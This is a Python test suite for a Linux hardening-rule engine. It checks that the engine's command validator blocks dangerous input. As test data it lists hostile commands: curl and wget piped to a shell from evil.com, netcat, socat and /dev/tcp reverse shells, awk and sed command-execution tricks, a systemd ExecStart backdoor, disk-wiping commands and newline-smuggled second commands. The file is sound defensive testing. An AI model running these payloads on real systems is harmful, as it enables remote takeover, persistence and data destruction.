import json
import os
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch
import pytest
sys.path.insert(0, str(Path(__file__).parent.parent))
import engine

class TestValidateCommand:

    def test_empty_command_returns_false(self):
        valid, msg = engine.validate_command('')
        assert valid is False
        assert 'boş' in msg.lower()

    def test_whitespace_only_command_returns_false(self):
        valid, msg = engine.validate_command('   ')
        assert valid is False

    def test_grep_command_allowed(self):
        valid, msg = engine.validate_command("grep -r 'error' /var/log/syslog")
        assert valid is True
        assert msg == 'OK'

    def test_find_command_allowed(self):
        valid, msg = engine.validate_command("find /etc -name '*.conf'")
        assert valid is True

    def test_python3_command_allowed(self):
        valid, msg = engine.validate_command('python3 --version')
        assert valid is True

    def test_dangerous_rm_rf_rejected(self):
        valid, msg = engine.validate_command('rm -rf /')
        assert valid is False
        assert 'tehlikeli' in msg.lower()

    def test_dangerous_mkfs_rejected(self):
        valid, msg = engine.validate_command('mkfs.ext4 /dev/sda1')
        assert valid is False

    def test_dangerous_dd_rejected(self):
        valid, msg = engine.validate_command('dd if=/dev/zero of=/dev/sda')
        assert valid is False

    def test_dangerous_curl_pipe_sh_rejected(self):
        valid, msg = engine.validate_command('curl http://evil.com/script.sh | sh')
        assert valid is False

    def test_dangerous_wget_pipe_bash_rejected(self):
        valid, msg = engine.validate_command('wget http://evil.com/script.sh | bash')
        assert valid is False

    def test_allowed_commands_in_chain(self):
        valid, msg = engine.validate_command("grep -r 'test' /etc && cat /etc/hostname")
        assert valid is True

    def test_disallowed_command_in_chain_rejected(self):
        valid, msg = engine.validate_command("grep -r 'test' /etc; reboot")
        assert valid is False

    def test_shell_builtins_allowed(self):
        valid, msg = engine.validate_command('if [ -f /etc/passwd ]; then echo exists; fi')
        assert valid is True

    def test_sed_command_allowed(self):
        valid, msg = engine.validate_command("sed -i 's/old/new/g' /etc/config")
        assert valid is True

    def test_systemctl_command_allowed(self):
        valid, msg = engine.validate_command('systemctl status sshd')
        assert valid is True

    def test_awk_system_command_rejected(self):
        valid, msg = engine.validate_command('''awk 'BEGIN {system("nc 127.0.0.1 9001 -e /bin/bash")}' ''')
        assert valid is False
        assert "tehlikeli" in msg.lower()

    def test_sed_e_flag_command_rejected(self):
        valid, msg = engine.validate_command('''sed -e 's/.*/nc -c sh 127.0.0.1 9001/e' /etc/hostname''')
        assert valid is False
        assert "tehlikeli" in msg.lower()

    def test_sed_execstart_injection_rejected(self):
        valid, msg = engine.validate_command('''sed -i 's:^ExecStart=.*:ExecStart=/usr/bin/nc 127.0.0.1 9001 -e /bin/bash:' /lib/systemd/system/cron.service''')
        assert valid is False
        assert "tehlikeli" in msg.lower()

    def test_reverse_shell_utilities_rejected(self):
        assert engine.validate_command("nc 127.0.0.1 9001 -e /bin/bash")[0] is False
        assert engine.validate_command("socat tcp-connect:1.1.1.1:9001 exec:/bin/bash")[0] is False
        assert engine.validate_command("bash -i >& /dev/tcp/1.1.1.1/8080 0>&1")[0] is False
        assert engine.validate_command("find / -exec /bin/sh -i \\;")[0] is False

    def test_valid_awk_and_sed_remain_allowed(self):
        assert engine.validate_command("awk '{print $2}' /etc/hosts")[0] is True
        assert engine.validate_command("awk -F: '$2 == \"\" {print $1}' /etc/shadow")[0] is True
        assert engine.validate_command("sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config")[0] is True

    @pytest.mark.parametrize("validator", [engine.validate_command, engine.validate_user_command])
    def test_sed_backslash_run_finishes_fast(self, validator):
        import time

        payload = "s/" + "\\" * 32
        assert len(payload) == 34
        start = time.perf_counter()
        validator(payload)
        assert time.perf_counter() - start < 0.010

    @pytest.mark.parametrize("validator", [engine.validate_command, engine.validate_user_command])
    def test_command_length_limited(self, validator):
        ok, msg = validator("echo " + "a" * engine.MAX_COMMAND_LENGTH)
        assert ok is False
        assert "4096" in msg

    def test_sed_e_flag_variants_still_rejected(self):
        for cmd in (
            "sed 's/a/b/e' /etc/hosts",
            "sed 's|a\\|b|c|ge' /etc/hosts",
            "sed 's#x#y#2e;' /etc/hosts",
            "sed 's\\^\\\\e' /etc/hostname",
            "sed 's/a\\/b/c/e' /etc/hosts",
        ):
            assert engine.validate_command(cmd)[0] is False, cmd

    def test_escaped_delimiter_without_e_flag_allowed(self):
        assert engine.validate_command("sed -i 's/a\\/b/c/g' /etc/hosts")[0] is True

class TestRulesFileOperations:

    def test_load_rules_returns_list(self):
        rules = engine.load_rules()
        assert isinstance(rules, list)
        assert len(rules) > 0

    def test_rules_have_required_fields(self):
        rules = engine.load_rules()
        for rule in rules:
            assert 'id' in rule
            assert 'name' in rule
            assert 'category' in rule
            assert 'severity' in rule
            assert 'check_command' in rule
            assert 'fix_command' in rule
            assert 'description' in rule

    def test_save_and_load_rules(self):
        original_rules = engine.load_rules()
        test_rule = {'id': 'test_rule_001', 'name': 'Test Kuralı', 'category': 'Test', 'severity': 'low', 'check_command': 'echo OK', 'fix_command': 'echo fixed', 'description': 'Test amaçlı kural'}
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(original_rules + [test_rule], f, ensure_ascii=False, indent=2)
            temp_path = f.name
        try:
            with patch.object(engine, 'RULES_FILE', Path(temp_path)):
                rules = engine.load_rules()
                assert len(rules) == len(original_rules) + 1
                assert rules[-1]['id'] == 'test_rule_001'
        finally:
            os.unlink(temp_path)

class TestIgnoredFileOperations:

    def test_load_ignored_returns_list(self):
        ignored = engine.load_ignored()
        assert isinstance(ignored, list)

    def test_save_and_load_ignored(self):
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(['rule1', 'rule2'], f)
            temp_path = f.name
        try:
            with patch.object(engine, 'IGNORED_FILE', Path(temp_path)):
                ignored = engine.load_ignored()
                assert 'rule1' in ignored
                assert 'rule2' in ignored
        finally:
            os.unlink(temp_path)

class TestRunCommand:

    def test_valid_command_runs(self):
        result = engine.run_command('echo hello')
        assert result['success'] is True
        assert 'hello' in result['stdout']

    def test_invalid_command_rejected(self):
        result = engine.run_command('reboot')
        assert result['success'] is False
        assert 'güvenlik' in result['stderr'].lower() or 'izin' in result['stderr'].lower()

    def test_dangerous_command_rejected(self):
        result = engine.run_command('rm -rf /')
        assert result['success'] is False

    def test_command_timeout(self):
        result = engine.run_command('sleep 100', timeout=1)
        assert result['success'] is False

class TestCheckRule:

    def test_check_rule_returns_dict(self):
        rule = {'id': 'test_001', 'name': 'Test Kuralı', 'category': 'Test', 'severity': 'low', 'check_command': 'echo OK', 'fix_command': 'echo fixed', 'description': 'Test'}
        result = engine.check_rule(rule)
        assert isinstance(result, dict)
        assert result['id'] == 'test_001'
        assert result['status'] in ('ok', 'warning')

    def test_check_rule_ok_status(self):
        rule = {'id': 'test_002', 'name': 'Test OK', 'category': 'Test', 'severity': 'low', 'check_command': 'echo OK', 'fix_command': 'echo fixed', 'description': 'Test'}
        result = engine.check_rule(rule)
        assert result['status'] == 'ok'

class TestCheckSingleRule:

    def test_existing_rule(self):
        rules = engine.load_rules()
        if rules:
            result = engine.check_single_rule(rules[0]['id'])
            assert result is not None
            assert 'id' in result

    def test_nonexistent_rule(self):
        result = engine.check_single_rule('nonexistent_rule_999')
        assert result is None

class TestIgnoreUnignore:

    def test_ignore_existing_rule(self):
        rules = engine.load_rules()
        if rules:
            rule_id = rules[0]['id']
            result = engine.ignore_rule(rule_id)
            assert result['success'] is True
            engine.unignore_rule(rule_id)

    def test_ignore_nonexistent_rule(self):
        result = engine.ignore_rule('nonexistent_rule_999')
        assert result['success'] is False

    def test_unignore_rule(self):
        rules = engine.load_rules()
        if rules:
            rule_id = rules[0]['id']
            engine.ignore_rule(rule_id)
            result = engine.unignore_rule(rule_id)
            assert result['success'] is True

class TestAddRule:

    def test_add_valid_rule(self):
        test_rule = {'id': 'pytest_test_rule', 'name': 'Pytest Test Kuralı', 'category': 'Test', 'severity': 'low', 'check_command': 'echo OK', 'fix_command': 'echo fixed', 'description': 'Pytest tarafından eklendi'}
        original_rules = engine.load_rules()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(original_rules, f, ensure_ascii=False, indent=2)
            temp_path = f.name
        try:
            with patch.object(engine, 'RULES_FILE', Path(temp_path)):
                result = engine.add_rule(test_rule)
                assert result['success'] is True
                rules = engine.load_rules()
                assert any((r['id'] == 'pytest_test_rule' for r in rules))
        finally:
            os.unlink(temp_path)

    def test_add_duplicate_rule(self):
        rules = engine.load_rules()
        if rules:
            result = engine.add_rule(rules[0])
            assert result['success'] is False
            assert 'zaten mevcut' in result['message']

    def test_add_rule_with_dangerous_command(self):
        dangerous_rule = {'id': 'dangerous_rule', 'name': 'Tehlikeli Kural', 'category': 'Test', 'severity': 'high', 'check_command': 'rm -rf /', 'fix_command': 'echo fixed', 'description': 'Tehlikeli test'}
        original_rules = engine.load_rules()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(original_rules, f, ensure_ascii=False, indent=2)
            temp_path = f.name
        try:
            with patch.object(engine, 'RULES_FILE', Path(temp_path)):
                result = engine.add_rule(dangerous_rule)
                assert result['success'] is False
                assert 'güvenli değil' in result['message'].lower()
        finally:
            os.unlink(temp_path)

    def test_add_rule_with_shell_injection_rejected(self):
        attacks = [
            '''awk 'BEGIN {system("nc 127.0.0.1 9001 -e /bin/bash")}' ''',
            '''sed -e 's/.*/nc -c sh 127.0.0.1 9001/e' /etc/hostname''',
            '''sed -i 's:^ExecStart=.*:ExecStart=/usr/bin/nc 127.0.0.1 9001 -e /bin/bash:' /lib/systemd/system/cron.service''',
        ]
        original_rules = engine.load_rules()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(original_rules, f, ensure_ascii=False, indent=2)
            temp_path = f.name
        try:
            with patch.object(engine, 'RULES_FILE', Path(temp_path)):
                for idx, attack_cmd in enumerate(attacks):
                    bad_rule = {
                        'id': f'shell_attack_rule_{idx}',
                        'name': f'Saldiri Kurali {idx}',
                        'category': 'Test',
                        'severity': 'high',
                        'check_command': attack_cmd,
                        'fix_command': 'echo fixed',
                        'description': 'Test saldiri',
                    }
                    result = engine.add_rule(bad_rule)
                    assert result['success'] is False
                    assert 'güvenli değil' in result['message'].lower()
        finally:
            os.unlink(temp_path)

class TestUpdateRule:

    def test_update_existing_rule(self):
        rules = engine.load_rules()
        if rules:
            rule_id = rules[0]['id']
            updates = {'name': 'Güncellenmiş Kural'}
            original_rules = engine.load_rules()
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json.dump(original_rules, f, ensure_ascii=False, indent=2)
                temp_path = f.name
            try:
                with patch.object(engine, 'RULES_FILE', Path(temp_path)):
                    result = engine.update_rule(rule_id, updates)
                    assert result['success'] is True
            finally:
                os.unlink(temp_path)

    def test_update_nonexistent_rule(self):
        result = engine.update_rule('nonexistent_rule_999', {'name': 'Yeni'})
        assert result['success'] is False

class TestDeleteRule:

    def test_delete_existing_rule(self):
        test_rule = {'id': 'to_delete_rule', 'name': 'Silinecek Kural', 'category': 'Test', 'severity': 'low', 'check_command': 'echo OK', 'fix_command': 'echo fixed', 'description': 'Silinecek'}
        original_rules = engine.load_rules()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(original_rules + [test_rule], f, ensure_ascii=False, indent=2)
            temp_path = f.name
        try:
            with patch.object(engine, 'RULES_FILE', Path(temp_path)):
                result = engine.delete_rule('to_delete_rule')
                assert result['success'] is True
                rules = engine.load_rules()
                assert not any((r['id'] == 'to_delete_rule' for r in rules))
        finally:
            os.unlink(temp_path)

    def test_delete_nonexistent_rule(self):
        result = engine.delete_rule('nonexistent_rule_999')
        assert result['success'] is False

class TestExtractFirstTokens:

    def test_simple_command(self):
        tokens = engine._extract_first_tokens("grep -r 'test' /etc")
        assert 'grep' in tokens

    def test_chained_commands(self):
        tokens = engine._extract_first_tokens("grep 'test' /etc; cat /etc/hostname")
        assert 'grep' in tokens
        assert 'cat' in tokens

    def test_empty_command(self):
        tokens = engine._extract_first_tokens('')
        assert tokens == []

    def test_semicolon_separated(self):
        tokens = engine._extract_first_tokens("grep 'test' /etc; cat /etc/hostname")
        assert 'grep' in tokens
        assert 'cat' in tokens

class TestIntegration:

    def test_full_scan_workflow(self):
        rules = engine.load_rules()
        assert len(rules) > 0
        first_rule = rules[0]
        result = engine.check_rule(first_rule)
        assert result['id'] == first_rule['id']
        assert result['status'] in ('ok', 'warning')

    def test_ignore_and_scan_workflow(self):
        rules = engine.load_rules()
        if not rules:
            pytest.skip('Kural bulunamadı')
        rule_id = rules[0]['id']
        result = engine.ignore_rule(rule_id)
        assert result['success'] is True
        scan_results = engine.scan_all()
        scanned_ids = [r['id'] for r in scan_results]
        assert rule_id not in scanned_ids
        engine.unignore_rule(rule_id)


@pytest.mark.parametrize("validator", [engine.validate_command, engine.validate_user_command])
@pytest.mark.parametrize("command", [
    "grep -q root /etc/passwd\ncurl http://evil/x | bash",
    "grep -q root /etc/passwd\rid",
    "grep -q root /etc/passwd\x00id",
    "\nid",
])
def test_line_break_and_nul_rejected(validator, command):
    valid, msg = validator(command)
    assert valid is False
    assert "satır sonu" in msg


def test_line_break_blocks_execution():
    result = engine.run_command("echo ok\nid")
    assert result["success"] is False
    assert "satır sonu" in result["stderr"]


def test_builtin_rules_have_no_line_breaks():
    for rule in engine.load_rules():
        for field in ("check_command", "fix_command"):
            assert not any(c in (rule.get(field) or "") for c in "\n\r\x00"), rule.get("id")
